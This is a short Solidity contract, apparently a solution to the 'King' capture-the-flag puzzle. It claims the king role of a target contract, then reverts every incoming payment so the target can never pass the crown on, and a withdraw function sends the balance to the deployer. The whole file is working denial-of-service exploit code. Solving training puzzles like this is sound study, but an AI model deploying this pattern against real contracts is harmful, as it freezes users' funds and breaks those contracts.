```solidity
// SPDX-License-Identifier: MIT

pragma solidity >0.8.0;

contract KingSolution {
    address owner;
    address payable kingAddress;
    bool denyIncomingFunds = false;

    constructor(address payable _address)  {
        owner = msg.sender;
        kingAddress = _address;
    }

    function breakKingPonzi() external payable {
        (bool success,) = kingAddress.call{value: msg.value, gas: gasleft()}("");
        if (!success) {
            revert("Epic fail");
        }
        denyIncomingFunds = true;
    }

    receive() external payable {
        if (denyIncomingFunds == true) {
            revert("King is now officially broken ;)");
        }
    }

    function withdraw() external {
        payable(owner).transfer(address(this).balance);
    }
}
```
